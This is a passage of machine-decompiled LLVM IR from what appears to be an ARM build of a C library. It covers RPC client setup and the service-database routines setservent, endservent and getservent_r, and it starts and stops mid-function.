  %v2_2e7d8 = ptrtoint i32* %stack_var_-1160 to i32
  store i32 %v2_2e7d8, i32* @r2, align 4
  store i32 1024, i32* @r4, align 4
  %v2_2e7e0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_2e7e0, i32* @sb, align 4
  br label %dec_label_pc_2e81c

dec_label_pc_2e7f0:                               ; preds = %dec_label_pc_2e81c, %dec_label_pc_2e844
  %v3_2e7f0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_2e7f0, i32* %r3.global-to-local, align 4
  %v3_2e7f4 = icmp eq i32 %v3_2e7f0, -1
  br i1 %v3_2e7f4, label %dec_label_pc_2e7fc, label %dec_label_pc_2e944

dec_label_pc_2e7fc:                               ; preds = %dec_label_pc_2e7f0
  %v0_2e7fc = call i32 @__GI___errno_location()
  store i32 %v0_2e7fc, i32* %r0.global-to-local, align 4
  %v1_2e800 = inttoptr i32 %v0_2e7fc to i32*
  %v2_2e800 = load i32, i32* %v1_2e800, align 4
  store i32 %v2_2e800, i32* %r3.global-to-local, align 4
  %v7_2e804 = icmp eq i32 %v2_2e800, 34
  br i1 %v7_2e804, label %dec_label_pc_2e80c, label %dec_label_pc_2e944

dec_label_pc_2e80c:                               ; preds = %dec_label_pc_2e7fc
  %v0_2e80c = load i32, i32* @r4, align 4
  %v1_2e80c = add i32 %v0_2e80c, 14
  %v1_2e810 = and i32 %v1_2e80c, -8
  store i32 %v1_2e810, i32* %r3.global-to-local, align 4
  %v1_2e814 = load i32, i32* @sp, align 4
  %v2_2e814 = sub i32 %v1_2e814, %v1_2e810
  %v1_2e818 = add i32 %v2_2e814, 16
  store i32 %v1_2e818, i32* @r2, align 4
  br label %dec_label_pc_2e81c

dec_label_pc_2e81c:                               ; preds = %dec_label_pc_2e7c8, %dec_label_pc_2e80c
  %v0_2e820 = phi i32 [ 1024, %dec_label_pc_2e7c8 ], [ %v0_2e80c, %dec_label_pc_2e80c ]
  store i32 %v2_2e7d4, i32* @ip, align 4
  store i32 %v0_2e820, i32* @r3, align 4
  %v0_2e828 = load i32, i32* @sl, align 4
  store i32 %v0_2e828, i32* %r0.global-to-local, align 4
  %v2_2e834 = inttoptr i32 %v0_2e828 to i8*
  %v3_2e834 = call i32 @gethostbyname_r(i8* %v2_2e834, i32 %v2_2e7d0)
  store i32 %v3_2e834, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_2e834, 65536
  %v1_2e838 = sdiv i32 %sext, 65536
  store i32 %v1_2e838, i32* @r5, align 4
  %sext.off = or i32 %sext, 65535
  %tmp = icmp ult i32 %sext.off, 131071
  %v0_2e83c = load i32, i32* @r4, align 4
  %v2_2e83c = mul i32 %v0_2e83c, 2
  store i32 %v2_2e83c, i32* @r4, align 4
  br i1 %tmp, label %dec_label_pc_2e844, label %dec_label_pc_2e7f0

dec_label_pc_2e844:                               ; preds = %dec_label_pc_2e81c
  %v3_2e844 = load i32, i32* %stack_var_-52, align 4
  %v2_2e848 = icmp eq i32 %v3_2e844, 0
  br i1 %v2_2e848, label %dec_label_pc_2e7f0, label %dec_label_pc_2e850

dec_label_pc_2e850:                               ; preds = %dec_label_pc_2e844
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_2e85c = add i32 %v3_2e844, 16
  %v2_2e85c = inttoptr i32 %v1_2e85c to i32*
  %v3_2e85c = load i32, i32* %v2_2e85c, align 4
  store i32 %v3_2e85c, i32* @r3, align 4
  %v2_2e860 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_2e860, i32* @r4, align 4
  %v1_2e864 = inttoptr i32 %v3_2e85c to i32*
  %v2_2e864 = load i32, i32* %v1_2e864, align 4
  store i32 %v2_2e864, i32* @r1, align 4
  %v1_2e868 = add i32 %v3_2e844, 12
  %v2_2e868 = inttoptr i32 %v1_2e868 to i32*
  %v3_2e868 = load i32, i32* %v2_2e868, align 4
  store i32 %v3_2e868, i32* @r2, align 4
  %v2_2e86c = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_2e86c, i32* @r0, align 4
  %v0_2e870 = call i32 @memcpy()
  %v0_2e874 = load i32, i32* @r6, align 4
  %v1_2e874 = add i32 %v0_2e874, 4
  store i32 %v2_2e860, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v0_2e890 = load i32, i32* @r7, align 4
  store i32 %v0_2e890, i32* @r1, align 4
  %v0_2e894 = load i32, i32* @r8, align 4
  store i32 %v0_2e894, i32* @r2, align 4
  store i32 2, i32* %stack_var_-88, align 4
  %v7_2e8a0 = call i32 @__GI_clntudp_create(i32 %v2_2e860, i32 %v0_2e890, i32 %v0_2e894, i32 5, i32 0, i32 %v1_2e874)
  store i32 %v7_2e8a0, i32* %r0.global-to-local, align 4
  %v2_2e8a4 = icmp eq i32 %v7_2e8a0, 0
  %v1_2e8a8 = load i32, i32* @r6, align 4
  %v2_2e8a8 = inttoptr i32 %v1_2e8a8 to i32*
  store i32 %v7_2e8a0, i32* %v2_2e8a8, align 4
  %v0_2e8ac = load i32, i32* @r5, align 4
  store i32 %v0_2e8ac, i32* @r4, align 4
  br i1 %v2_2e8a4, label %dec_label_pc_2e8b4, label %dec_label_pc_2e8c0

dec_label_pc_2e8b4:                               ; preds = %dec_label_pc_2e850
  %v0_2e8b4 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_2e8b4, i32* %r0.global-to-local, align 4
  %v1_2e8b8 = inttoptr i32 %v0_2e8b4 to i32*
  %v2_2e8b8 = load i32, i32* %v1_2e8b8, align 4
  store i32 %v2_2e8b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2e948

dec_label_pc_2e8c0:                               ; preds = %dec_label_pc_2e850
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_2e8c4 = load i32, i32* @r6, align 4
  %v2_2e8c4 = add i32 %v1_2e8c4, 16
  %v3_2e8c4 = inttoptr i32 %v2_2e8c4 to i32*
  store i32 1, i32* %v3_2e8c4, align 4
  %v0_2e8c8 = load i32, i32* @r7, align 4
  %v1_2e8c8 = load i32, i32* @r6, align 4
  %v2_2e8c8 = add i32 %v1_2e8c8, 8
  %v3_2e8c8 = inttoptr i32 %v2_2e8c8 to i32*
  store i32 %v0_2e8c8, i32* %v3_2e8c8, align 4
  %v0_2e8cc = load i32, i32* @r8, align 4
  %v1_2e8cc = load i32, i32* @r6, align 4
  %v2_2e8cc = add i32 %v1_2e8cc, 12
  %v3_2e8cc = inttoptr i32 %v2_2e8cc to i32*
  store i32 %v0_2e8cc, i32* %v3_2e8cc, align 4
  %v0_2e8d0 = load i32, i32* @sl, align 4
  store i32 %v0_2e8d0, i32* @r1, align 4
  %v0_2e8d4 = load i32, i32* @r6, align 4
  %v1_2e8d4 = add i32 %v0_2e8d4, 20
  %v2_2e8d4 = inttoptr i32 %v1_2e8d4 to i32*
  %v3_2e8d4 = load i32, i32* %v2_2e8d4, align 4
  store i32 %v3_2e8d4, i32* %r0.global-to-local, align 4
  %v2_2e8dc = call i32 @strncpy(i32 %v3_2e8d4, i32 %v0_2e8d0)
  store i32 %v2_2e8dc, i32* %r0.global-to-local, align 4
  %v0_2e8e0 = load i32, i32* @r6, align 4
  %v1_2e8e0 = add i32 %v0_2e8e0, 20
  %v2_2e8e0 = inttoptr i32 %v1_2e8e0 to i32*
  %v3_2e8e0 = load i32, i32* %v2_2e8e0, align 4
  store i32 %v3_2e8e0, i32* %r3.global-to-local, align 4
  %v0_2e8e4 = load i32, i32* @r5, align 4
  %v1_2e8e4 = trunc i32 %v0_2e8e4 to i8
  %v3_2e8e4 = add i32 %v3_2e8e0, 255
  %v4_2e8e4 = inttoptr i32 %v3_2e8e4 to i8*
  store i8 %v1_2e8e4, i8* %v4_2e8e4, align 1
  br label %dec_label_pc_2e8e8

dec_label_pc_2e8e8:                               ; preds = %dec_label_pc_2e770, %dec_label_pc_2e8c0
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 25, i32* %r3.global-to-local, align 4
  store i32 25, i32* %stack_var_-72, align 4
  %v0_2e8fc = load i32, i32* @r6, align 4
  %v1_2e8fc = inttoptr i32 %v0_2e8fc to i32*
  %v2_2e8fc = load i32, i32* %v1_2e8fc, align 4
  store i32 %v2_2e8fc, i32* %r4.global-to-local, align 4
  %v2_2e900 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_2e900, i32* %r3.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_2e908 = add i32 %v2_2e8fc, 4
  %v2_2e908 = inttoptr i32 %v1_2e908 to i32*
  %v3_2e908 = load i32, i32* %v2_2e908, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 %v2_2e8fc, i32* %r0.global-to-local, align 4
  %v1_2e92c = inttoptr i32 %v3_2e908 to i32*
  %v2_2e92c = load i32, i32* %v1_2e92c, align 4
  call void @__pseudo_branch(i32 %v2_2e92c)
  %v0_2e938 = load i32, i32* %r0.global-to-local, align 4
  %v2_2e938 = icmp eq i32 %v0_2e938, 0
  br i1 %v2_2e938, label %dec_label_pc_2e948, label %bb44

bb44:                                             ; preds = %dec_label_pc_2e8e8
  %v1_2e93c = load i32, i32* %r7.global-to-local, align 4
  %v2_2e93c = load i32, i32* @r6, align 4
  %v3_2e93c = add i32 %v2_2e93c, 16
  %v4_2e93c = inttoptr i32 %v3_2e93c to i32*
  store i32 %v1_2e93c, i32* %v4_2e93c, align 4
  %v1_2e950.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2e948

dec_label_pc_2e944:                               ; preds = %dec_label_pc_2e7fc, %dec_label_pc_2e7f0
  store i32 13, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2e948

dec_label_pc_2e948:                               ; preds = %bb, %bb44, %dec_label_pc_2e8e8, %dec_label_pc_2e8b4, %dec_label_pc_2e944
  %v1_2e950 = phi i32 [ %v1_2e950.pre, %bb44 ], [ 0, %dec_label_pc_2e8e8 ], [ %v1_2e718, %bb ], [ %v2_2e8b8, %dec_label_pc_2e8b4 ], [ 13, %dec_label_pc_2e944 ]
  store i32 %v3_2e6d8, i32* %r4.global-to-local, align 4
  store i32 %v12_2e6d8, i32* %r7.global-to-local, align 4
  ret i32 %v1_2e950

; uselistorder directives
  uselistorder i32 %v2_2e7a4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_2e784, { 1, 0, 2 }
  uselistorder i32 %v1_2e738, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 8, 6, 7, 9, 11, 10, 15, 13, 12, 14, 17, 16, 19, 18, 22, 20, 24, 21, 25, 23, 26, 0 }
  uselistorder i32 13, { 2, 7, 6, 8, 11, 9, 0, 1, 10, 4, 5, 3 }
  uselistorder i32 25, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_2e948, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_2e8e8, { 1, 0 }
  uselistorder label %dec_label_pc_2e81c, { 1, 0 }
  uselistorder label %dec_label_pc_2e7f0, { 1, 0 }
  uselistorder label %dec_label_pc_2e7c8, { 1, 0 }
  uselistorder label %dec_label_pc_2e7a4, { 1, 0 }
  uselistorder label %dec_label_pc_2e74c, { 1, 0 }
  uselistorder label %dec_label_pc_2e728, { 1, 0 }
}

define i32 @__initbuf() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_2e954 = load i32, i32* @r4, align 4
  store i32 %v3_2e954, i32* %stack_var_-12, align 4
  %v6_2e954 = load i32, i32* @r5, align 4
  store i32 55916, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  %v4_2e964 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55916) to i32*), align 4
  %v2_2e968 = icmp eq i32 %v4_2e964, 0
  br i1 %v2_2e968, label %dec_label_pc_2e974, label %dec_label_pc_2e980

dec_label_pc_2e974:                               ; preds = %entry
  %v1_2e978 = call i32 @malloc(i32 304)
  %v1_2e97c = load i32, i32* @r4, align 4
  %v2_2e97c = load i32, i32* @r5, align 4
  %v3_2e97c = add i32 %v2_2e97c, %v1_2e97c
  %v4_2e97c = inttoptr i32 %v3_2e97c to i32*
  store i32 %v1_2e978, i32* %v4_2e97c, align 4
  %v0_2e980.pre = load i32, i32* @r4, align 4
  %v1_2e980.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2e980

dec_label_pc_2e980:                               ; preds = %entry, %dec_label_pc_2e974
  %v1_2e980 = phi i32 [ %v1_2e980.pre, %dec_label_pc_2e974 ], [ 55916, %entry ]
  %v0_2e980 = phi i32 [ %v0_2e980.pre, %dec_label_pc_2e974 ], [ ptrtoint (i32* @global_var_44990.1184 to i32), %entry ]
  %.0 = phi i32 [ %v1_2e978, %dec_label_pc_2e974 ], [ undef, %entry ]
  %v2_2e980 = add i32 %v0_2e980, %v1_2e980
  %v3_2e980 = inttoptr i32 %v2_2e980 to i32*
  %v4_2e980 = load i32, i32* %v3_2e980, align 4
  %v2_2e984 = icmp eq i32 %v4_2e980, 0
  call void @__pseudo_cond_branch(i1 %v2_2e984, i32 ptrtoint (i32* @global_var_29d60.1872 to i32))
  %v2_2e990 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2e990, i32* @r4, align 4
  store i32 %v6_2e954, i32* @r5, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_2e980, { 1, 0 }
}

define i32 @__GI_endservent(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  %v2_2e9b4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 20840), i32* @r4, align 4
  store i32 55920, i32* @r6, align 4
  %v4_2e9d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_2e9d0)
  %v0_2e9e4 = load i32, i32* @r5, align 4
  %v2_2e9e4 = add i32 %v0_2e9e4, 36
  %v3_2e9e4 = inttoptr i32 %v2_2e9e4 to i32*
  %v4_2e9e4 = load i32, i32* %v3_2e9e4, align 4
  store i32 190960, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2e9e4)
  %v0_2e9f0 = load i32, i32* @r5, align 4
  %v1_2e9f0 = load i32, i32* @r6, align 4
  %v2_2e9f0 = add i32 %v1_2e9f0, %v0_2e9f0
  %v3_2e9f0 = inttoptr i32 %v2_2e9f0 to i32*
  %v4_2e9f0 = load i32, i32* %v3_2e9f0, align 4
  %v2_2e9f4 = icmp eq i32 %v4_2e9f0, 0
  store i32 %v2_2e9b4, i32* @r7, align 4
  br i1 %v2_2e9f4, label %dec_label_pc_2ea0c, label %dec_label_pc_2ea00

dec_label_pc_2ea00:                               ; preds = %entry
  %v1_2ea00 = inttoptr i32 %v4_2e9f0 to i32*
  %v2_2ea00 = call i32 @__GI_config_close(i32* %v1_2ea00)
  %v1_2ea08 = load i32, i32* @r5, align 4
  %v2_2ea08 = load i32, i32* @r6, align 4
  %v3_2ea08 = add i32 %v2_2ea08, %v1_2ea08
  %v4_2ea08 = inttoptr i32 %v3_2ea08 to i32*
  store i32 0, i32* %v4_2ea08, align 4
  %v1_2ea14.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2ea0c

dec_label_pc_2ea0c:                               ; preds = %entry, %dec_label_pc_2ea00
  %v1_2ea14 = phi i32 [ %v0_2e9f0, %entry ], [ %v1_2ea14.pre, %dec_label_pc_2ea00 ]
  %v3_2ea14 = add i32 %v1_2ea14, 55940
  %v4_2ea14 = inttoptr i32 %v3_2ea14 to i32*
  store i32 0, i32* %v4_2ea14, align 4
  %v0_2ea24 = load i32, i32* @r5, align 4
  %v2_2ea24 = add i32 %v0_2ea24, 76
  %v3_2ea24 = inttoptr i32 %v2_2ea24 to i32*
  %v4_2ea24 = load i32, i32* %v3_2ea24, align 4
  call void @__pseudo_branch(i32 %v4_2ea24)
  ret i32 %v2_2e9b4

; uselistorder directives
  uselistorder i32 %v0_2e9f0, { 1, 0 }
  uselistorder label %dec_label_pc_2ea0c, { 1, 0 }
}

define i32 @function_2ea40(i32 %arg1) local_unnamed_addr {
dec_label_pc_2ea40:
  %v0_2ea40 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2ea40, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_2ea40
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2ea40, %bb
  %v4_2ea58 = phi i32 [ %arg1, %dec_label_pc_2ea40 ], [ 0, %bb ]
  ret i32 %v4_2ea58

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @setservent(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_2ea5c = load i32, i32* @r4, align 4
  %v6_2ea5c = load i32, i32* @r5, align 4
  %v9_2ea5c = load i32, i32* @r6, align 4
  %v12_2ea5c = load i32, i32* @r7, align 4
  %v15_2ea5c = load i32, i32* @r8, align 4
  %v18_2ea5c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  %v2_2ea70 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 20840), i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 55920, i32* @r7, align 4
  %v4_2ea90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_2ea90)
  %v0_2eaa4 = load i32, i32* @r5, align 4
  %v2_2eaa4 = add i32 %v0_2eaa4, 36
  %v3_2eaa4 = inttoptr i32 %v2_2eaa4 to i32*
  %v4_2eaa4 = load i32, i32* %v3_2eaa4, align 4
  call void @__pseudo_branch(i32 %v4_2eaa4)
  %v0_2eab0 = load i32, i32* @r5, align 4
  %v1_2eab0 = load i32, i32* @r7, align 4
  %v2_2eab0 = add i32 %v1_2eab0, %v0_2eab0
  %v3_2eab0 = inttoptr i32 %v2_2eab0 to i32*
  %v4_2eab0 = load i32, i32* %v3_2eab0, align 4
  store i32 %v2_2ea70, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_2eac0.1990 to i32), i32* @lr, align 4
  %v1_2eabc = icmp ne i32 %v4_2eab0, 0
  call void @__pseudo_cond_branch(i1 %v1_2eabc, i32 ptrtoint (i32* @global_var_2c344.1991 to i32))
  %v0_2eac4 = load i32, i32* @r5, align 4
  %v2_2eac4 = add i32 %v0_2eac4, -34448
  store i32 %v2_2eac4, i32* @r0, align 4
  %v1_2eac8 = call i32 @__GI_config_open(i32 %v2_2eac4)
  %v0_2eacc = load i32, i32* @r6, align 4
  %v2_2eacc = icmp eq i32 %v0_2eacc, 0
  %v1_2ead0 = load i32, i32* @r5, align 4
  %v2_2ead0 = load i32, i32* @r7, align 4
  %v3_2ead0 = add i32 %v2_2ead0, %v1_2ead0
  %v4_2ead0 = inttoptr i32 %v3_2ead0 to i32*
  store i32 %v1_2eac8, i32* %v4_2ead0, align 4
  br i1 %v2_2eacc, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_2eadc = load i32, i32* @r5, align 4
  %v4_2eadc = add i32 %v2_2eadc, 55940
  %v5_2eadc = inttoptr i32 %v4_2eadc to i32*
  store i32 1, i32* %v5_2eadc, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_2eaec = load i32, i32* @r5, align 4
  %v2_2eaec = add i32 %v0_2eaec, 76
  %v3_2eaec = inttoptr i32 %v2_2eaec to i32*
  %v4_2eaec = load i32, i32* %v3_2eaec, align 4
  call void @__pseudo_branch(i32 %v4_2eaec)
  store i32 %v3_2ea5c, i32* @r4, align 4
  store i32 %v6_2ea5c, i32* @r5, align 4
  store i32 %v9_2ea5c, i32* @r6, align 4
  store i32 %v12_2ea5c, i32* @r7, align 4
  store i32 %v15_2ea5c, i32* @r8, align 4
  store i32 %v18_2ea5c, i32* @lr, align 4
  ret i32 %v2_2ea70

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_2eb08(i32 %arg1) local_unnamed_addr {
dec_label_pc_2eb08:
  %v0_2eb08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2eb08, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_2eb08
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_2eb08, %bb
  %v4_2eb18 = phi i32 [ %arg1, %dec_label_pc_2eb08 ], [ 0, %bb ]
  ret i32 %v4_2eb18

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getservent_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %v3_2eb28 = load i32, i32* @r4, align 4
  %v6_2eb28 = load i32, i32* @r5, align 4
  %v9_2eb28 = load i32, i32* @r6, align 4
  %v12_2eb28 = load i32, i32* @r7, align 4
  %v15_2eb28 = load i32, i32* @r8, align 4
  %v18_2eb28 = load i32, i32* @sb, align 4
  %v21_2eb28 = load i32, i32* @sl, align 4
  %v24_2eb28 = load i32, i32* @fp, align 4
  %v27_2eb28 = load i32, i32* @lr, align 4
  store i32 0, i32* @sb, align 4
  %v2_2eb38 = icmp ugt i32 %arg3, 303
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @fp, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_2eb54 = inttoptr i32 %arg4 to i32*
  store i32 0, i32* %v2_2eb54, align 4
  br i1 %v2_2eb38, label %dec_label_pc_2eb60, label %bb

bb:                                               ; preds = %entry
  store i32 34, i32* %r4.global-to-local, align 4
  %v3_2eb5c = icmp ult i32 %arg3, 302
  br i1 %v3_2eb5c, label %dec_label_pc_2ec60, label %dec_label_pc_2eb60

dec_label_pc_2eb60:                               ; preds = %entry, %bb
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_2eb68 = load i32, i32* @r6, align 4
  %v2_2eb68 = add i32 %v0_2eb68, 20840
  store i32 %v2_2eb68, i32* @r4, align 4
  store i32 %v2_2eb68, i32* %r2.global-to-local, align 4
  store i32 164, i32* %r3.global-to-local, align 4
  store i32 55920, i32* @r5, align 4
  %v2_2eb80 = add i32 %v0_2eb68, 164
  %v3_2eb80 = inttoptr i32 %v2_2eb80 to i32*
  %v4_2eb80 = load i32, i32* %v3_2eb80, align 4
  call void @__pseudo_branch(i32 %v4_2eb80)
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_2eb94 = load i32, i32* @r6, align 4
  %v2_2eb94 = add i32 %v0_2eb94, 36
  %v3_2eb94 = inttoptr i32 %v2_2eb94 to i32*
  %v4_2eb94 = load i32, i32* %v3_2eb94, align 4
  store i32 %v4_2eb94, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_2eb94)
  %v0_2eba0 = load i32, i32* @r6, align 4
  %v1_2eba0 = load i32, i32* @r5, align 4
  %v2_2eba0 = add i32 %v1_2eba0, %v0_2eba0
  %v3_2eba0 = inttoptr i32 %v2_2eba0 to i32*
  %v4_2eba0 = load i32, i32* %v3_2eba0, align 4
  %v2_2eba4 = icmp eq i32 %v4_2eba0, 0
  br i1 %v2_2eba4, label %bb16, label %.thread

bb16:                                             ; preds = %dec_label_pc_2eb60
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_2eb60, %bb16
  %storemerge = phi i32 [ 55940, %bb16 ], [ %v4_2eba0, %dec_label_pc_2eb60 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 191412, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_2eba4, i32 ptrtoint (i32* @global_var_2ea5c.2002 to i32))
  %v0_2ebb4 = load i32, i32* @r6, align 4
  %v1_2ebb4 = load i32, i32* @r5, align 4
  %v2_2ebb4 = add i32 %v1_2ebb4, %v0_2ebb4
  %v3_2ebb4 = inttoptr i32 %v2_2ebb4 to i32*
  %v4_2ebb4 = load i32, i32* %v3_2ebb4, align 4
  %v2_2ebb8 = icmp eq i32 %v4_2ebb4, 0
  br i1 %v2_2ebb8, label %dec_label_pc_2ec44, label %dec_label_pc_2ebc0

dec_label_pc_2ebc0:                               ; preds = %.thread
  %v0_2ebc0 = load i32, i32* @r8, align 4
  %v1_2ebc0 = add i32 %v0_2ebc0, -48
  %v2_2ebc4 = add i32 %v4_2ebb4, 16
  %v3_2ebc4 = inttoptr i32 %v2_2ebc4 to i32*
  store i32 %v1_2ebc0, i32* %v3_2ebc4, align 4
  store i32 -34432, i32* %r3.global-to-local, align 4
  %v2_2ebd0 = add i32 %v4_2ebb4, 8
  %v3_2ebd0 = inttoptr i32 %v2_2ebd0 to i32*
  store i32 48, i32* %v3_2ebd0, align 4
  %v0_2ebd4 = load i32, i32* @sl, align 4
  %v2_2ebd4 = add i32 %v4_2ebb4, 4
  %v3_2ebd4 = inttoptr i32 %v2_2ebd4 to i32*
  store i32 %v0_2ebd4, i32* %v3_2ebd4, align 4
  %v0_2ebd8 = load i32, i32* @r6, align 4
  %v1_2ebd8 = load i32, i32* %r3.global-to-local, align 4
  %v2_2ebd8 = add i32 %v1_2ebd8, %v0_2ebd8
  store i32 %v2_2ebd8, i32* %r3.global-to-local, align 4
  %v2_2ebdc = ptrtoint i32* %stack_var_-44 to i32
  store i32 459531, i32* %r2.global-to-local, align 4
  %v4_2ebe4 = inttoptr i32 %v4_2ebb4 to i32*
  %v5_2ebe4 = call i32 @__GI_config_read(i32* %v4_2ebe4, i32 %v2_2ebdc, i32 459531, i32 %v2_2ebd8)
  %v2_2ebe8 = icmp eq i32 %v5_2ebe4, 0
  br i1 %v2_2ebe8, label %dec_label_pc_2ec44, label %dec_label_pc_2ebf0

dec_label_pc_2ebf0:                               ; preds = %dec_label_pc_2ebc0
  %v3_2ebf0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_2ebf0, i32* %r2.global-to-local, align 4
  store i32 %v3_2ebf0, i32* %r4.global-to-local, align 4
  %v1_2ebf8 = inttoptr i32 %v3_2ebf0 to i32*
  %v2_2ebf8 = load i32, i32* %v1_2ebf8, align 4
  store i32 %v2_2ebf8, i32* %r3.global-to-local, align 4
  %v4_2ebf8 = add i32 %v3_2ebf0, 4
  store i32 %v4_2ebf8, i32* @r4, align 4
  %v1_2ebfc = load i32, i32* @r7, align 4
  %v2_2ebfc = inttoptr i32 %v1_2ebfc to i32*
  store i32 %v2_2ebf8, i32* %v2_2ebfc, align 4
  %v0_2ec00 = load i32, i32* @r4, align 4
  %v1_2ec00 = add i32 %v0_2ec00, 4
  store i32 %v1_2ec00, i32* @r5, align 4
  %v0_2ec04 = load i32, i32* %r2.global-to-local, align 4
  %v1_2ec04 = add i32 %v0_2ec04, 4
  %v2_2ec04 = inttoptr i32 %v1_2ec04 to i32*
  %v3_2ec04 = load i32, i32* %v2_2ec04, align 4
  store i32 %v3_2ec04, i32* @r0, align 4
  store i32 %v1_2ec00, i32* %stack_var_-44, align 4
  %v1_2ec0c = call i32 @atol(i32 %v3_2ec04)
  %tmp17 = mul i32 %v1_2ec0c, 256
  %v3_2ec14 = and i32 %tmp17, 16776960
  store i32 %v3_2ec14, i32* %r3.global-to-local, align 4
  %v0_2ec18 = load i32, i32* @r4, align 4
  %v1_2ec18 = add i32 %v0_2ec18, 4
  %v2_2ec18 = inttoptr i32 %v1_2ec18 to i32*
  %v3_2ec18 = load i32, i32* %v2_2ec18, align 4
  store i32 %v3_2ec18, i32* %r2.global-to-local, align 4
  %v1_2ec1c = and i32 %tmp17, 65280
  %v0_2ec20 = load i32, i32* @r5, align 4
  %v1_2ec20 = add i32 %v0_2ec20, 4
  store i32 %v1_2ec20, i32* %r5.global-to-local, align 4
  %tmp18 = udiv i32 %v1_2ec0c, 256
  %v4_2ec24 = urem i32 %tmp18, 256
  %v5_2ec24 = or i32 %v4_2ec24, %v1_2ec1c
  store i32 %v5_2ec24, i32* %r3.global-to-local, align 4
  %v0_2ec28 = load i32, i32* @sb, align 4
  store i32 %v0_2ec28, i32* %r4.global-to-local, align 4
  %v1_2ec2c = load i32, i32* @r7, align 4
  %v2_2ec2c = add i32 %v1_2ec2c, 4
  %v3_2ec2c = inttoptr i32 %v2_2ec2c to i32*
  store i32 %v1_2ec20, i32* %v3_2ec2c, align 4
  %v0_2ec30 = load i32, i32* @r7, align 4
  %v1_2ec30 = load i32, i32* @fp, align 4
  %v2_2ec30 = inttoptr i32 %v1_2ec30 to i32*
  store i32 %v0_2ec30, i32* %v2_2ec30, align 4
  %v0_2ec34 = load i32, i32* %r3.global-to-local, align 4
  %v1_2ec34 = load i32, i32* @r7, align 4
  %v2_2ec34 = add i32 %v1_2ec34, 8
